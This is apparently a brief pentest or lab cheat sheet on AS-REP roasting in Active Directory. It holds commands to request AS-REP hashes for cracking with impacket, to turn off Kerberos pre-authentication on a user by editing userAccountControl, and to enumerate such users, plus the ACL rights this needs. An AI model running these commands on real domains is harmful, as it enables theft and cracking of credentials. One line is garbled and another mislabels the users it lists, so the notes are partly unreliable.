
```bash
impacket-GetNPUsers lol.local/ -usersfile valid_users.txt -format hashcat -dc-ip 10.10.111.10
```

> [!NOTE] NOTE
> You have to have a valid account credentials on the domain

---

we can turn on `Don't require pre-auth` by manipulating  the `useraccountcontrol`:
```powershell
Set-DomainObject -Identity ITguy -XOR @{useraccountcontrol=4194304} -Verbose
```

but the user has to have to has:
- ``WriteProperty``
- ``GenericWrite`` on the entire user object
- `WriteDACL` indirect but **we can add yourself a new ACE** granting yourself `WriteProperty` or `GenericWrite`, then use that to modify `userAccountControl`.
---

get the users of which the `pre-auth` is enabled by:
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
